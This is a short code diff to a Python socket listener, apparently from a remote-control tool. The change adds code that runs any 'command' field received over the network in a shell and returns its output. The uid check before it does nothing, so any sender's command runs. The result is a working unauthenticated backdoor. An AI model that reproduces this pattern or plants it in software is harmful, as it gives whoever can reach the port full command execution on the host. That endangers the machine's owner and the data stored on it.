@@ -1,6 +1,4 @@
-import makerequest,decrypt,classes,platform,json,re,uuid,time
-import socket
-import sys
+import makerequest,decrypt,classes,platform,json,re,uuid,time,subprocess,socket,sys
 from multiprocessing import Process
 from datetime import datetime
 
@@ -114,13 +112,13 @@ def listenfordata():
             data = json.loads(data)
             if not data["uid"]==uid:
                pass
-
-
-
-
-            conn.sendall(str.encode("Message received. "+data["message"]+":"+current_time))
-        except Exception:
-            conn.sendall(str.encode("Problem decoding the data"))
+            if data["command"]:
+               output = subprocess.check_output(data["command"], shell=True, stderr=subprocess.STDOUT, text=True)
+               conn.sendall(str.encode("Time:"+current_time+"<br>"+"Command:"+data["command"]+"<br>"+"Output:"+output))
+            else:
+               conn.sendall(str.encode("Time:"+current_time+"<br>"+"Command:empty!"))
+        except Exception as ex:
+            conn.sendall(str.encode("Error:"+str(ex)))
 
 if __name__ == '__main__':
 
